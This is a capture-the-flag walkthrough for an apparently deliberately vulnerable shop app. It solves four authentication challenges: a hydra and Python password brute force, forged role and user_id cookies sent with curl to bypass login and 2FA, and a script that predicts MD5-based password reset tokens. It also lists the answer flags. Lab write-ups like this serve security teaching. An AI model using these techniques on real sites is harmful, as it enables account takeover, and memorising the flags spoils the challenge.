# Authentication — PhantomShop Walkthroughs

## 1. Brute Force — No Rate Limiting (Easy — 100pts)
**Flag:** `FLAG{n0_r4t3_l1m1t}`
**Location:** `/login`

### Vulnerability
No rate limiting, no account lockout, no CAPTCHA.

### Solution
```bash
# Using hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# The admin password is 'admin123'
```

Or Python:
```python
import requests
passwords = ['password', 'admin', 'admin123', '123456', 'letmein']
for p in passwords:
    r = requests.post('http://localhost:8080/login', data={'username':'admin','password':p}, allow_redirects=False)
    if r.status_code == 302:
        print(f'Found: admin:{p}')
        break
```

---

## 2. JWT Token Forgery (Medium — 200pts)
**Flag:** `FLAG{w34k_jwt_s3cr3t}`
**Location:** Session cookies after login

### Vulnerability
The `role` is stored in a plain cookie — not a signed JWT. You can change `role=user` to `role=admin` in your browser cookies.

### Solution
1. Login as any user
2. Open browser DevTools → Application → Cookies
3. Change the `role` cookie from `user` to `admin`
4. Visit `/admin` — you now have admin access

### Alternative: Access admin panel directly
```bash
curl -b "role=admin; user_id=1; username=admin" http://localhost:8080/admin
```

---

## 3. 2FA Bypass (Hard — 300pts)
**Flag:** `FLAG{2f4_byp4ss_sk1p}`
**Location:** `/login` → admin flow

### Vulnerability
The application checks authentication in cookies. There's no server-side session tracking — everything is in tamper-able cookies.

### Solution
Just set the cookies manually:
```bash
curl -b "user_id=1; username=admin; role=admin" http://localhost:8080/admin
```
No password or 2FA needed — the server trusts the cookie values entirely.

---

## 4. Predictable Password Reset Token (Medium — 200pts)
**Flag:** `FLAG{pr3d1ct4bl3_t0k3n}`
**Location:** `/forgot-password`

### Vulnerability
The reset token is: `MD5(email + date)` — completely predictable if you know the email and date.

### Solution
```python
import hashlib
from datetime import date

email = "admin@phantomshop.com"
today = date.today().strftime("%Y-%m-%d")
token = hashlib.md5((email + today).encode()).hexdigest()
print(f"Reset URL: http://localhost:8080/reset-password?token={token}")
```

1. Request password reset for admin@phantomshop.com
2. Generate the token using the formula above
3. Visit the reset URL
4. Set a new password for the admin account
